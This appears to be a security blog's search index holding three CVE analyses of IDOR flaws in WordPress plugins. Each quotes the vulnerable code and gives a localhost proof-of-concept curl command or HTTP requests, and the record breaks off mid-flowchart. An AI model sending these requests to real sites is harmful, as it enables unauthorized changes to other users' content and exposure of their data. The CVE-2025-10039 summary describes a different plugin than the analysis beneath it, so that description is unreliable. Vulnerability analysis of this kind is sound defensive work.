[{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Business Directory Plugin.","date":"2025-12-31","objectID":"/posts/2025-12-31-cve-2024-13887/","tags":["analyst","plugin","idor"],"title":"CVE-2024-13887 Analysis \u0026 POC","uri":"/posts/2025-12-31-cve-2024-13887/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info The Business Directory Plugin – Easy Listing Directories for WordPress plugin contains an Insecure Direct Object Reference (IDOR) vulnerability in all versions up to 6.4.14, through the ajax_listing_submit_image_upload function due to missing validation on a user-controlled key. This allows unauthenticated attackers to upload arbitrary images to listings. CVE ID: CVE-2024-13887 Vulnerability Type: Insecure Direct Object References (IDOR) Affected Versions: \u003c= 6.4.14 Patched Versions: 6.4.15 CVSS severity: Low (5.3) Required Privilege: Unauthenticated Product: WordPress Business Directory Plugin ","date":"2025-12-31","objectID":"/posts/2025-12-31-cve-2024-13887/:1:0","tags":["analyst","plugin","idor"],"title":"CVE-2024-13887 Analysis \u0026 POC","uri":"/posts/2025-12-31-cve-2024-13887/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging Virtual Machine Docker Plugin Version – Business Directory: 6.4.14 – vulnerable 6.4.15 – patched Diff Tool (diff) → Meld or any diff tool. ","date":"2025-12-31","objectID":"/posts/2025-12-31-cve-2024-13887/:2:0","tags":["analyst","plugin","idor"],"title":"CVE-2024-13887 Analysis \u0026 POC","uri":"/posts/2025-12-31-cve-2024-13887/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis The plugin registers an AJAX handler for logged-out users: class-wpbdp.php v6.4.14 add_action( 'wp_ajax_nopriv_wpbdp-listing-submit-image-upload', array( \u0026$this, 'ajax_listing_submit_image_upload' ) ); wp_ajax_nopriv is a hook available to all users, including unauthenticated users. When a request is sent to the /wp-admin/admin-ajax.php endpoint with the parameter action=wpbdp-listing-submit-image-upload, the callback ajax_listing_submit_image_upload is executed: class-wpbdp.php v6.4.14 public function ajax_listing_submit_image_upload() { $res = new WPBDP_AJAX_Response(); $listing_id = intval( $_REQUEST['listing_id'] ); ... $files = wpbdp_flatten_files_array( isset( $_FILES['images'] ) ? $_FILES['images'] : array() ); $errors = array(); $listing = WPBDP_Listing::get( $listing_id ); $slots_available = 0; $plan = $listing-\u003eget_fee_plan(); if ( ! $plan ) { return $res-\u003esend_error( __( 'Please select a plan before uploading images to the listing', 'business-directory-plugin' ) ); } $slots_available = absint( $plan-\u003efee_images ) - absint( $_POST['images_count'] ); if ( 0 \u003e= $slots_available ) { return $res-\u003esend_error( __( 'Can not upload any more images for this listing.', 'business-directory-plugin' ) ); } elseif ( $slots_available \u003c count( $files ) ) { return $res-\u003esend_error( sprintf( _nx( 'You\\'re trying to upload %1$d images, but only have %2$d slot available. Please adjust your selection.', 'You\\'re trying to upload %1$d images, but only have %2$d slots available. Please adjust your selection.', $slots_available, 'listing image upload', 'business-directory-plugin' ), count( $files ), $slots_available ) ); } foreach ( $files as $i =\u003e $file ) { $image_error = ''; $attachment_id = wpbdp_media_upload( $file, true, true, array( 'image' =\u003e true, 'min-size' =\u003e intval( wpbdp_get_option( 'image-min-filesize' ) ) * 1024, 'max-size' =\u003e intval( wpbdp_get_option( 'image-max-filesize' ) ) * 1024, 'min-width' =\u003e wpbdp_get_option( 'image-min-width' ), 'min-height' =\u003e wpbdp_get_option( 'image-min-height' ), ), $image_error ); // TODO: handle errors. if ( $image_error ) { $errors[ $file['name'] ] = $image_error; } else { $attachments[] = $attachment_id; } } $html = ''; foreach ( $attachments as $attachment_id ) { $html .= wpbdp_render( 'submit-listing-images-single', array( 'image_id' =\u003e $attachment_id, 'listing_id' =\u003e $listing_id, ), false ); } $has_images = $listing-\u003eget_images( 'ids' ); $listing-\u003eset_images( $attachments, true ); // Maybe set thumbnail if there aren't already images on this listing. if ( ! $has_images ) { $image_id = reset( $attachments ); $listing-\u003eset_thumbnail_id( $image_id ); } if ( $errors ) { $error_msg = ''; foreach ( $errors as $fname =\u003e $error ) { $error_msg .= sprintf( '\u0026#149; %s: %s', $fname, $error ) . '\u003cbr /\u003e'; } $res-\u003eadd( 'uploadErrors', $error_msg ); } $res-\u003eadd( 'is_admin', wpbdp_user_is_admin() ); $res-\u003eadd( 'slots_available', $slots_available ); $res-\u003eadd( 'attachmentIds', $attachments ); $res-\u003eadd( 'html', $html ); $res-\u003esend(); } The function retrieves listing_id and images from the request: $listing_id = intval( $_REQUEST['listing_id'] ); $files = wpbdp_flatten_files_array( isset( $_FILES['images'] ) ? $_FILES['images'] : array() ); The function stops if a plan has not been selected: $plan = $listing-\u003eget_fee_plan(); if ( ! $plan ) { return $res-\u003esend_error( __( 'Please select a plan before uploading images to the listing', 'business-directory-plugin' ) ); } Select plan Then it checks the remaining available upload slots: $slots_available = absint( $plan-\u003efee_images ) - absint( $_POST['images_count'] ); if ( 0 \u003e= $slots_available ) { return $res-\u003esend_error( __( 'Can not upload any more images for this listing.', 'business-directory-plugin' ) ); } elseif ( $slots_available \u003c count( $files ) ) { return $res-\u003esend_error( sprintf( _nx( 'You\\'re trying to upload %1$d images, but only have %2$d slot available. Please adjust your selection.', 'You\\'re trying to upload %1$d images, but only have %2$","date":"2025-12-31","objectID":"/posts/2025-12-31-cve-2024-13887/:3:0","tags":["analyst","plugin","idor"],"title":"CVE-2024-13887 Analysis \u0026 POC","uri":"/posts/2025-12-31-cve-2024-13887/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow flowchart TD A[\"Unauthenticated Attacker\"] --\u003e B[\"Send POST request to /wp-admin/admin-ajax.php\"] B --\u003e C[\"action=wpbdp-listing-submit-image-upload\"] C --\u003e D[\"WordPress triggers ajax_listing_submit_image_upload()\"] D --\u003e E[\"No authentication required (wp_ajax_nopriv_)\"] E --\u003e F[\"Extract listing_id from request\"] F --\u003e G[\"Load listing object by ID\"] G --\u003e H{\"Listing has fee plan?\"} H -- No --\u003e I[\"Return error: select a plan\"] H -- Yes --\u003e J[\"Calculate remaining image slots\"] J --\u003e K{\"slots_available \u003e 0?\"} K -- No --\u003e L[\"Return error: no available slots\"] K -- Yes --\u003e M[\"Process uploaded files\"] M --\u003e N[\"Call wpbdp_media_upload()\"] N --\u003e O[\"Attach uploaded image to listing\"] O --\u003e P[\"Set thumbnail if needed\"] P --\u003e Q[\"Return success response (JSON)\"] Q --\u003e R[\"Image successfully attached to arbitrary listing\"] R --\u003e S[\"IDOR: No ownership / permission validation\"] flowchart TD A[\"Unauthenticated Attacker\"] --\u003e B[\"Send POST request to /wp-admin/admin-ajax.php\"] B --\u003e C[\"action=wpbdp-listing-submit-image-upload\"] C --\u003e D[\"WordPress triggers ajax_listing_submit_image_upload()\"] D --\u003e E[\"No authentication required (wp_ajax_nopriv_)\"] E --\u003e F[\"Extract listing_id from request\"] F --\u003e G[\"Load listing object by ID\"] G --\u003e H{\"Listing has fee plan?\"} H -- No --\u003e I[\"Return error: select a plan\"] H -- Yes --\u003e J[\"Calculate remaining image slots\"] J --\u003e K{\"slots_available \u003e 0?\"} K -- No --\u003e L[\"Return error: no available slots\"] K -- Yes --\u003e M[\"Process uploaded files\"] M --\u003e N[\"Call wpbdp_media_upload()\"] N --\u003e O[\"Attach uploaded image to listing\"] O --\u003e P[\"Set thumbnail if needed\"] P --\u003e Q[\"Return success response (JSON)\"] Q --\u003e R[\"Image successfully attached to arbitrary listing\"] R --\u003e S[\"IDOR: No ownership / permission validation\"] flowchart TD A[\"Unauthenticated Attacker\"] --\u003e B[\"Send POST request to /wp-admin/admin-ajax.php\"] B --\u003e C[\"action=wpbdp-listing-submit-image-upload\"] C --\u003e D[\"WordPress triggers ajax_listing_submit_image_upload()\"] D --\u003e E[\"No authentication required (wp_ajax_nopriv_)\"] E --\u003e F[\"Extract listing_id from request\"] F --\u003e G[\"Load listing object by ID\"] G --\u003e H{\"Listing has fee plan?\"} H -- No --\u003e I[\"Return error: select a plan\"] H -- Yes --\u003e J[\"Calculate remaining image slots\"] J --\u003e K{\"slots_available \u003e 0?\"} K -- No --\u003e L[\"Return error: no available slots\"] K -- Yes --\u003e M[\"Process uploaded files\"] M --\u003e N[\"Call wpbdp_media_upload()\"] N --\u003e O[\"Attach uploaded image to listing\"] O --\u003e P[\"Set thumbnail if needed\"] P --\u003e Q[\"Return success response (JSON)\"] Q --\u003e R[\"Image successfully attached to arbitrary listing\"] R --\u003e S[\"IDOR: No ownership / permission validation\"] flowchart TD A[\"Unauthenticated Attacker\"] --\u003e B[\"Send POST request to /wp-admin/admin-ajax.php\"] B --\u003e C[\"action=wpbdp-listing-submit-image-upload\"] C --\u003e D[\"WordPress triggers ajax_listing_submit_image_upload()\"] D --\u003e E[\"No authentication required (wp_ajax_nopriv_)\"] E --\u003e F[\"Extract listing_id from request\"] F --\u003e G[\"Load listing object by ID\"] G --\u003e H{\"Listing has fee plan?\"} H -- No --\u003e I[\"Return error: select a plan\"] H -- Yes --\u003e J[\"Calculate remaining image slots\"] J --\u003e K{\"slots_available \u003e 0?\"} K -- No --\u003e L[\"Return error: no available slots\"] K -- Yes --\u003e M[\"Process uploaded files\"] M --\u003e N[\"Call wpbdp_media_upload()\"] N --\u003e O[\"Attach uploaded image to listing\"] O --\u003e P[\"Set thumbnail if needed\"] P --\u003e Q[\"Return success response (JSON)\"] Q --\u003e R[\"Image successfully attached to arbitrary listing\"] R --\u003e S[\"IDOR: No ownership / permission validation\"] ","date":"2025-12-31","objectID":"/posts/2025-12-31-cve-2024-13887/:4:0","tags":["analyst","plugin","idor"],"title":"CVE-2024-13887 Analysis \u0026 POC","uri":"/posts/2025-12-31-cve-2024-13887/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Send request: curl -X POST http://localhost/wp-admin/admin-ajax.php \\ -F \"action=wpbdp-listing-submit-image-upload\" \\ -F \"listing_id=88\" \\ -F \"images=@/path/to/image.jpg\" Result Result ","date":"2025-12-31","objectID":"/posts/2025-12-31-cve-2024-13887/:5:0","tags":["analyst","plugin","idor"],"title":"CVE-2024-13887 Analysis \u0026 POC","uri":"/posts/2025-12-31-cve-2024-13887/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion The CVE-2024-13887 vulnerability arises because the wpbdp-listing-submit-image-upload endpoint allows unauthenticated access and does not verify ownership of listing_id. This allows attackers to upload images to any valid listing simply by modifying the input parameter. Version 6.4.15 fixes this by adding nonce verification and ownership checks. ","date":"2025-12-31","objectID":"/posts/2025-12-31-cve-2024-13887/:6:0","tags":["analyst","plugin","idor"],"title":"CVE-2024-13887 Analysis \u0026 POC","uri":"/posts/2025-12-31-cve-2024-13887/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaways IDOR occurs due to missing resource ownership validation. wp_ajax_nopriv is a dangerous attack surface without additional authentication. Never trust user input such as listing_id. Always combine authentication + authorization when handling AJAX endpoints. ","date":"2025-12-31","objectID":"/posts/2025-12-31-cve-2024-13887/:7:0","tags":["analyst","plugin","idor"],"title":"CVE-2024-13887 Analysis \u0026 POC","uri":"/posts/2025-12-31-cve-2024-13887/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References IDOR WordPress Business Directory Plugin \u003c= 6.4.14 is vulnerable to Insecure Direct Object References (IDOR) ","date":"2025-12-31","objectID":"/posts/2025-12-31-cve-2024-13887/:8:0","tags":["analyst","plugin","idor"],"title":"CVE-2024-13887 Analysis \u0026 POC","uri":"/posts/2025-12-31-cve-2024-13887/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress FooGallery Plugin.","date":"2025-12-30","objectID":"/posts/2025-12-30-cve-2024-12114/","tags":["analyst","plugin","idor"],"title":"CVE-2024-12114 Analysis \u0026 POC","uri":"/posts/2025-12-30-cve-2024-12114/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info The FooGallery – Responsive Photo Gallery, Image Viewer, Justified, Masonry \u0026 Carousel plugin for WordPress contains an Insecure Direct Object Reference vulnerability in all versions up to and including 2.4.29 via the AJAX action foogallery_attachment_modal_save, due to missing authorization checks on a user-controlled key (img_id). This allows an authenticated attacker, with granted access or higher, to update the content of any post or page. The actual impact only occurs when the Gallery Creator role setting is set lower than “Editor”. CVE ID: CVE-2024-12114 Vulnerability Type: Insecure Direct Object References (IDOR) Affected Versions: \u003c= 2.4.29 Patched Versions: 2.4.30 CVSS severity: Low (4.3) Required Privilege: N/A Product: WordPress FooGallery Plugin ","date":"2025-12-30","objectID":"/posts/2025-12-30-cve-2024-12114/:1:0","tags":["analyst","plugin","idor"],"title":"CVE-2024-12114 Analysis \u0026 POC","uri":"/posts/2025-12-30-cve-2024-12114/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - FooGallery: 2.4.29 – vulnerable 2.4.30 – patched Diff Tool (diff) → Meld or any diff tool. Info According to the CVE description, the actual impact only occurs when the Gallery Creator role setting is set lower than “Editor”. You can configure it here: Gallery Creator role At that point, users with this role will be able to use the Add/Edit Gallery functionality: Create/Add ","date":"2025-12-30","objectID":"/posts/2025-12-30-cve-2024-12114/:2:0","tags":["analyst","plugin","idor"],"title":"CVE-2024-12114 Analysis \u0026 POC","uri":"/posts/2025-12-30-cve-2024-12114/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis The plugin registers an AJAX handler for logged-in users: class-gallery-attachment-modal.php v2.4.29 add_action( 'wp_ajax_foogallery_attachment_modal_save', array( $this, 'ajax_save_modal' ) ); wp_ajax_ is a hook for authenticated users (Subscriber+). When a request is sent to /wp-admin/admin-ajax.php with the parameter action=foogallery_attachment_modal_save, the callback ajax_save_modal is executed: class-gallery-attachment-modal.php v2.4.29 public function ajax_save_modal() { $foogallery = ( isset( $_POST['foogallery'] ) ? $_POST['foogallery'] : array() ); if ( !is_array( $foogallery ) || empty( $foogallery ) ) { return; } // Check for nonce security if ( ! wp_verify_nonce( $_POST['nonce'], 'foogallery-modal-nonce' ) ) { die ( 'Busted!'); } $img_id = intval( sanitize_text_field( $_POST['img_id'] ) ); if ( $img_id \u003e 0 ) { do_action( 'foogallery_attachment_save_data', $img_id, $foogallery ); } wp_die(); } The function retrieves foogallery from the request, checks whether it is a valid non-empty array, then verifies the nonce to ensure the request is valid: if ( ! wp_verify_nonce( $_POST['nonce'], 'foogallery-modal-nonce' ) ) { die ( 'Busted!'); } The function wp_verify_nonce() verifies whether the submitted nonce is valid (generated by the foogallery-modal-nonce action). If valid and img_id \u003e 0, do_action('foogallery_attachment_save_data', ...) is executed with the provided img_id and foogallery data. Previously, the plugin registered a series of callbacks for the foogallery_attachment_save_data action: Registered callbacks for action foogallery_attachment_save_data class-gallery-attachment-modal.php v2.4.29 public function foogallery_attachment_save_data_main( $img_id, $data ) { if ( is_array( $data ) \u0026\u0026 !empty( $data ) ) { $foogallery_post = array( 'ID' =\u003e $img_id ); if ( array_key_exists( 'title', $data ) ) { $foogallery_post['post_title'] = $data['title']; } if ( array_key_exists( 'caption', $data ) ) { $foogallery_post['post_excerpt'] = $data['caption']; } if ( array_key_exists( 'description', $data ) ) { $foogallery_post['post_content'] = $data['description']; } // Update post meta values if ( array_key_exists( 'alt-text', $data ) ) { update_post_meta( $img_id, '_wp_attachment_image_alt', $data['alt-text'] ); } if ( array_key_exists( 'custom-url', $data ) ) { update_post_meta( $img_id, '_foogallery_custom_url', $data['custom-url'] ); } if ( array_key_exists( 'custom-target', $data ) ) { update_post_meta( $img_id, '_foogallery_custom_target', $data['custom-target'] ); } if ( array_key_exists( 'custom-class', $data ) ) { update_post_meta( $img_id, '_foogallery_custom_class', $data['custom-class'] ); } if ( is_array( $foogallery_post ) \u0026\u0026 count( $foogallery_post ) \u003e 1 ) { // Update the post into the database wp_update_post( $foogallery_post ); } } } class-gallery-attachment-modal.php v2.4.29 public function foogallery_attachment_save_data_taxonomies( $img_id, $data ) { if ( is_array( $data ) \u0026\u0026 !empty( $data ) ) { if ( !$this-\u003eattachments_have_taxonomies() ) { return; } if ( array_key_exists( 'taxonomies', $data ) ) { foreach ( $data['taxonomies'] as $taxonomy =\u003e $taxonomy_value ) { $terms = explode( ',', $taxonomy_value ); if ( is_array( $terms ) ) { $terms = array_map( 'intval', $terms ); wp_set_object_terms( $img_id, $terms, $taxonomy, false ); } } } } } class-gallery-attachment-modal.php v2.4.29 public function foogallery_attachment_save_data_thumbnails( $img_id, $data ) { if ( is_array( $data ) \u0026\u0026 !empty( $data ) ) { if ( array_key_exists( 'crop_pos', $data ) ) { update_post_meta( $img_id, 'foogallery_crop_pos', $data['crop_pos'] ); } if ( array_key_exists( 'override-thumbnail-id', $data ) ) { update_post_meta( $img_id, 'foogallery_override_thumbnail', $data['override-thumbnail-id'] ); } } } class-gallery-attachment-modal.php v2.4.29 public function foogallery_attachment_save_data_advanced($img_id, $data ) { if ( is_array( $data ) \u0026\u0026 !empty( $data ) ) { if ( array_key_exists( 'data-width', $data ) ) { update_","date":"2025-12-30","objectID":"/posts/2025-12-30-cve-2024-12114/:3:0","tags":["analyst","plugin","idor"],"title":"CVE-2024-12114 Analysis \u0026 POC","uri":"/posts/2025-12-30-cve-2024-12114/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow flowchart TD A[\"Authenticated User (Subscriber+)\"] --\u003e B[\"Request admin-ajax.php?action=foogallery_attachment_modal_open\"] B --\u003e C[\"Verify nonce: foogallery_attachment_modal_open\"] C --\u003e D[\"Return HTML modal + embedded nonce (foogallery-modal-nonce)\"] D --\u003e E[\"User extracts nonce from response\"] E --\u003e F[\"Send request: action=foogallery_attachment_modal_save\"] F --\u003e G[\"Verify nonce: foogallery-modal-nonce\"] G --\u003e H[\"Extract img_id from request\"] H --\u003e I[\"No capability / ownership check (edit_post)\"] I --\u003e J[\"do_action(foogallery_attachment_save_data, img_id, data)\"] J --\u003e K[\"Update post / attachment data\"] K --\u003e L[\"Unauthorized modification of arbitrary gallery/post (IDOR)\"] flowchart TD A[\"Authenticated User (Subscriber+)\"] --\u003e B[\"Request admin-ajax.php?action=foogallery_attachment_modal_open\"] B --\u003e C[\"Verify nonce: foogallery_attachment_modal_open\"] C --\u003e D[\"Return HTML modal + embedded nonce (foogallery-modal-nonce)\"] D --\u003e E[\"User extracts nonce from response\"] E --\u003e F[\"Send request: action=foogallery_attachment_modal_save\"] F --\u003e G[\"Verify nonce: foogallery-modal-nonce\"] G --\u003e H[\"Extract img_id from request\"] H --\u003e I[\"No capability / ownership check (edit_post)\"] I --\u003e J[\"do_action(foogallery_attachment_save_data, img_id, data)\"] J --\u003e K[\"Update post / attachment data\"] K --\u003e L[\"Unauthorized modification of arbitrary gallery/post (IDOR)\"] flowchart TD A[\"Authenticated User (Subscriber+)\"] --\u003e B[\"Request admin-ajax.php?action=foogallery_attachment_modal_open\"] B --\u003e C[\"Verify nonce: foogallery_attachment_modal_open\"] C --\u003e D[\"Return HTML modal + embedded nonce (foogallery-modal-nonce)\"] D --\u003e E[\"User extracts nonce from response\"] E --\u003e F[\"Send request: action=foogallery_attachment_modal_save\"] F --\u003e G[\"Verify nonce: foogallery-modal-nonce\"] G --\u003e H[\"Extract img_id from request\"] H --\u003e I[\"No capability / ownership check (edit_post)\"] I --\u003e J[\"do_action(foogallery_attachment_save_data, img_id, data)\"] J --\u003e K[\"Update post / attachment data\"] K --\u003e L[\"Unauthorized modification of arbitrary gallery/post (IDOR)\"] flowchart TD A[\"Authenticated User (Subscriber+)\"] --\u003e B[\"Request admin-ajax.php?action=foogallery_attachment_modal_open\"] B --\u003e C[\"Verify nonce: foogallery_attachment_modal_open\"] C --\u003e D[\"Return HTML modal + embedded nonce (foogallery-modal-nonce)\"] D --\u003e E[\"User extracts nonce from response\"] E --\u003e F[\"Send request: action=foogallery_attachment_modal_save\"] F --\u003e G[\"Verify nonce: foogallery-modal-nonce\"] G --\u003e H[\"Extract img_id from request\"] H --\u003e I[\"No capability / ownership check (edit_post)\"] I --\u003e J[\"do_action(foogallery_attachment_save_data, img_id, data)\"] J --\u003e K[\"Update post / attachment data\"] K --\u003e L[\"Unauthorized modification of arbitrary gallery/post (IDOR)\"] ","date":"2025-12-30","objectID":"/posts/2025-12-30-cve-2024-12114/:4:0","tags":["analyst","plugin","idor"],"title":"CVE-2024-12114 Analysis \u0026 POC","uri":"/posts/2025-12-30-cve-2024-12114/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Perform an edit gallery action with a user that has the Gallery Creator role Search for the keyword foogallery-image-edit-modal and extract the nonce from the response Send a request to retrieve the nonce for the foogallery_attachment_modal_save_form POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost Cookie: valid_cookie action=foogallery_attachment_modal_open\u0026nonce=9ad3ed3e9b\u0026img_id=1\u0026gallery_id=1 Get nonce from response Send a request to modify data of any gallery POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost Cookie: valid_cookie action=foogallery_attachment_modal_save\u0026nonce=11bfc5f814\u0026foogallery[]=any_data\u0026img_id=1 Use UI to perform: Truy cập http://localhost/wp-admin/post.php?post=post_id\u0026action=edit# Edit and save Edit and save ","date":"2025-12-30","objectID":"/posts/2025-12-30-cve-2024-12114/:5:0","tags":["analyst","plugin","idor"],"title":"CVE-2024-12114 Analysis \u0026 POC","uri":"/posts/2025-12-30-cve-2024-12114/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion The vulnerability occurs due to missing authorization checks on img_id. Although a nonce check exists, the plugin still allows authenticated users to modify galleries they do not own, resulting in an IDOR vulnerability. Version 2.4.30 fixes this by checking current_user_can( 'edit_post', $img_id ). ","date":"2025-12-30","objectID":"/posts/2025-12-30-cve-2024-12114/:6:0","tags":["analyst","plugin","idor"],"title":"CVE-2024-12114 Analysis \u0026 POC","uri":"/posts/2025-12-30-cve-2024-12114/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaways Nonces do not replace authorization controls Always check permissions at the object level Never trust client-side data, even with a nonce IDOR often appears in AJAX handlers missing current_user_can() ","date":"2025-12-30","objectID":"/posts/2025-12-30-cve-2024-12114/:7:0","tags":["analyst","plugin","idor"],"title":"CVE-2024-12114 Analysis \u0026 POC","uri":"/posts/2025-12-30-cve-2024-12114/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References IDOR WordPress FooGallery Plugin \u003c= 2.4.29 is vulnerable to Insecure Direct Object References (IDOR) ","date":"2025-12-30","objectID":"/posts/2025-12-30-cve-2024-12114/:8:0","tags":["analyst","plugin","idor"],"title":"CVE-2024-12114 Analysis \u0026 POC","uri":"/posts/2025-12-30-cve-2024-12114/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress ELEX WordPress HelpDesk \u0026 Customer Ticketing System Plugin.","date":"2025-12-28","objectID":"/posts/2025-12-28-cve-2025-10039/","tags":["analyst","plugin","idor"],"title":"CVE-2025-10039 Analysis \u0026 POC","uri":"/posts/2025-12-28-cve-2025-10039/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info Plugin Fluent Forms – Customizable Contact Forms, Survey, Quiz, \u0026 Conversational Form Builder contains an Insecure Direct Object Reference (IDOR) vulnerability in all versions ≤ 3.2.9 via the submission_id parameter in the SCA payment confirmation endpoint. The vulnerability allows unauthenticated users to mark other users’ submissions as failed, disrupting the payment process. CVE ID: CVE-2025-10039 Vulnerability Type: Insecure Direct Object References (IDOR) Affected Versions: \u003c= 3.2.9 Patched Versions: 3.3.0 CVSS severity: Low (4.3) Required Privilege: Unauthenticated Product: WordPress ELEX WordPress HelpDesk \u0026 Customer Ticketing System Plugin ","date":"2025-12-28","objectID":"/posts/2025-12-28-cve-2025-10039/:1:0","tags":["analyst","plugin","idor"],"title":"CVE-2025-10039 Analysis \u0026 POC","uri":"/posts/2025-12-28-cve-2025-10039/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - ELEX WordPress HelpDesk \u0026 Customer Ticketing System: 3.2.9 – vulnerable 3.3.0 – patched Diff Tool (diff) → Meld or any diff tool. ","date":"2025-12-28","objectID":"/posts/2025-12-28-cve-2025-10039/:2:0","tags":["analyst","plugin","idor"],"title":"CVE-2025-10039 Analysis \u0026 POC","uri":"/posts/2025-12-28-cve-2025-10039/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis The plugin registers an AJAX handler for authenticated users: class-crm-ajax-functions.php v3.2.9 add_action( 'wp_ajax_eh_crm_ticket_single_view_client', array( 'CRM_Ajax', 'eh_crm_ticket_single_view_client' ) ); wp_ajax_ is a hook for authenticated users (Subscriber+). When a request is sent to /wp-admin/admin-ajax.php with the parameter action=eh_crm_ticket_single_view_client, the callback eh_crm_ticket_single_view_client is executed: class-crm-ajax-functions.php v3.2.9 public static function eh_crm_ticket_single_view_client() { if ( wp_verify_nonce( isset( $_POST['nonce'] ) ? sanitize_text_field( $_POST['nonce'] ) : '', 'wsdesk_nonce' ) ) { $ticket_id = isset( $_POST['ticket_id'] ) ? sanitize_text_field( $_POST['ticket_id'] ) : ''; $content = self::eh_crm_ticket_single_view_client_gen( $ticket_id ); wp_send_json_success( array( 'page' =\u003e $content ) ); die; } } This function verifies the nonce to mitigate CSRF attacks. It then extracts ticket_id from the request and calls eh_crm_ticket_single_view_client_gen() to retrieve the ticket content. Finally, the response is returned as JSON. class-crm-ajax-functions.php v3.2.9 public static function eh_crm_ticket_single_view_client_gen( $ticket_id ) { // Fetch ticket data based on user-supplied ticket_id $current = eh_crm_get_ticket( array( 'ticket_id' =\u003e $ticket_id ) ); $current_meta = eh_crm_get_ticketmeta( $ticket_id ); // Fetch internal users (agent/admin) $users_data = get_users( array( 'role__in' =\u003e array( 'administrator', 'WSDesk_Agents', 'WSDesk_Supervisor' ) )); ... // Render ticket content (HTML output) echo esc_html( $current[0]['ticket_title'] ); echo esc_html( $current[0]['ticket_email'] ); echo esc_html( $current[0]['ticket_date'] ); ... // Render conversation, attachments, metadata self::eh_crm_ticket_reply_section_gen_client( $ticket_id ); ... return ob_get_clean(); } The functions eh_crm_ticket_single_view_client_gen and eh_crm_get_ticketmeta are used to retrieve ticket data: class-crm-public-functions.php v3.2.9 function eh_crm_get_ticket( $args, $fields = null ) { set_time_limit( 300 ); $query = wpFluent()-\u003etable( tables: 'wsdesk_tickets' )-\u003ewhere( 'ticket_trash', 0 ); if ( null !== $fields ) { $fields = is_array( $fields ) ? $fields : array( $fields ); foreach ( $fields as $field ) { $query-\u003eselect( $field ); } } if ( is_array( $args ) ) { foreach ( $args as $key =\u003e $value ) { $allowed_fileds = array( 'ticket_id', 'ticket_author', 'ticket_email', 'ticket_date', 'ticket_title', 'ticket_parent', 'ticket_category', 'ticket_vendor', 'ticket_trash' ); if ( in_array( $key, $allowed_fileds, true ) ) { $query-\u003ewhere( $key, $value ); } } } $ticket = (array) $query-\u003efirst(); if ( ! $ticket ) { return false; } if ( isset( $ticket['ticket_content'] ) ) { $ticket['ticket_content'] = wp_kses_post( $ticket['ticket_content'] ); } return array( $ticket ); } class-crm-public-functions.php v3.2.9 function eh_crm_get_ticketmeta( $id, $key = null ) { set_time_limit( 300 ); global $wpdb; $data = $wpdb-\u003eget_results( $wpdb-\u003eprepare( 'SELECT meta_key,meta_value FROM ' . $wpdb-\u003eprefix . 'wsdesk_ticketsmeta WHERE ticket_id = %d', (int) $id ), ARRAY_A ); $retrived = array(); if ( null !== $key ) { $data = $wpdb-\u003eget_results( $wpdb-\u003eprepare( 'SELECT meta_key,meta_value FROM ' . $wpdb-\u003eprefix . 'wsdesk_ticketsmeta WHERE ticket_id = %d AND meta_key = %s', (int) $id, $key ), ARRAY_A ); } if ( ! $data ) { return false; } if ( null !== $key ) { return maybe_unserialize( $data[0]['meta_value'] ); } for ( $i = 0; $i \u003c count( $data ); $i++ ) { $retrived[ $data[ $i ]['meta_key'] ] = maybe_unserialize( $data[ $i ]['meta_value'] ); } return maybe_unserialize( $retrived ); } There is no validation to ensure the current user is the ticket owner or has permission to view the ticket → IDOR Patch v3.3.0 Patch v3.3.0 The patch prevents IDOR by enforcing user-based access control, specifically: Comparing ticket_author with current_user_id Allowing access only for authorized roles (administrator, WSDe","date":"2025-12-28","objectID":"/posts/2025-12-28-cve-2025-10039/:3:0","tags":["analyst","plugin","idor"],"title":"CVE-2025-10039 Analysis \u0026 POC","uri":"/posts/2025-12-28-cve-2025-10039/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow flowchart TD A[\"Authenticated User (Subscriber+)\"] --\u003e B[\"Request admin-ajax.php?action=eh_crm_ticket_single_view_client\"] B --\u003e C[\"Verify nonce\"] C --\u003e D[\"Get ticket_id from request\"] D --\u003e E[\"Load ticket by ticket_id\"] E --\u003e F[\"No ownership check\"] F --\u003e G[\"No role validation\"] G --\u003e H[\"Return full ticket data\"] H --\u003e I[\"User can view other users' tickets (IDOR)\"] flowchart TD A[\"Authenticated User (Subscriber+)\"] --\u003e B[\"Request admin-ajax.php?action=eh_crm_ticket_single_view_client\"] B --\u003e C[\"Verify nonce\"] C --\u003e D[\"Get ticket_id from request\"] D --\u003e E[\"Load ticket by ticket_id\"] E --\u003e F[\"No ownership check\"] F --\u003e G[\"No role validation\"] G --\u003e H[\"Return full ticket data\"] H --\u003e I[\"User can view other users' tickets (IDOR)\"] flowchart TD A[\"Authenticated User (Subscriber+)\"] --\u003e B[\"Request admin-ajax.php?action=eh_crm_ticket_single_view_client\"] B --\u003e C[\"Verify nonce\"] C --\u003e 